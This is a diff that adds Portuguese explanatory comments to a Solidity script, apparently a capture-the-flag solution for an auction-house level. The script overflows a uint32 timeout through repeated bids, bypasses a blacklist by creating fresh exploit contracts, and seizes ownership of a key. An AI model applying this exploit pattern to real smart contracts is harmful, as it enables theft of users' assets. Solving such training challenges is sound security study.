@@ -39,17 +39,17 @@ contract DistractAndDestroySolution is Script {
     console.logUint(type(uint32).max);
     exploiterContract exploit;
     AuctionHouse.Bidder memory topBidder;
-    for (uint i = 0; i < 15; i++) {
+    for (uint i = 0; i < 15; i++) { // precisa somar YEAR 15 vezes para que tenhamos um uint overflow em timeout
       topBidder = level.topBidder();
-      exploit = new exploiterContract(level);
+      exploit = new exploiterContract(level); //precisamos sempre criar um novo contrato para bypassar a blacklist
       exploit.beTopBidder{value: uint256(topBidder.bid) *2}();
-      exploit.withdrawFromAuction();
+      exploit.withdrawFromAuction(); 
     } 
-    console.log("timeout: ", uint256(level.timeout()));
+    console.log("timeout: ", uint256(level.timeout())); //printa o novo valor de timeout após o overflow
     topBidder = level.topBidder();
-    exploit = new exploiterContract(level);
+    exploit = new exploiterContract(level); //cria o novo contrato com uint32(block.timestamp) > timeout
     exploit.beTopBidder{value: uint256(topBidder.bid) *2}();
-    exploit.claim();
+    exploit.claim(); //faz o contrato se tornar phoenixKey.owner e transfere-o para nós
 
   }
 } 
